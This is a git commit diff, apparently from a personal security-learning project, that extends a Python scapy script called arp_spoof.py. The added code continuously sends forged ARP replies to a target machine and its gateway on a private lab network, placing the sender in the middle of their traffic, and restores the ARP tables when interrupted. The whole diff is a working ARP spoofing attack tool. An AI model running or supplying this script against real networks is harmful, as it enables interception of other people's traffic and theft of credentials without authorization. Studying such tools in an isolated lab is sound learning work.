b9b4bc244bdd8780d203e4c8cc18c664460635d5
Areid0093 <54606271+Areid0093@users.noreply.github.com>
2020-07-06 09:55:10 -0500

    arp spoof w/ restore

--- arp_spoof.py
+++ arp_spoof.py
@@ -13,6 +13,27 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
-get_mac('10.0.2.1')
+
+def restore(destination_ip, source_ip):
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
+target_ip = '10.0.2.10'
+gateway_ip = '10.0.2.1'
+
+try:
+    sent_packets_count = 0
+    while True:
+        spoof(target_ip, gateway_ip)
+        spoof(gateway_ip, target_ip)
+        sent_packets_count += 2
+        print('\r[+] Packets sent: ' + str(sent_packets_count), end='')
+        time.sleep(2)
+except KeyboardInterrupt:
+    print('\n[+] Detected CTRL + C ..... Resetting ARP Tables.\n')
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
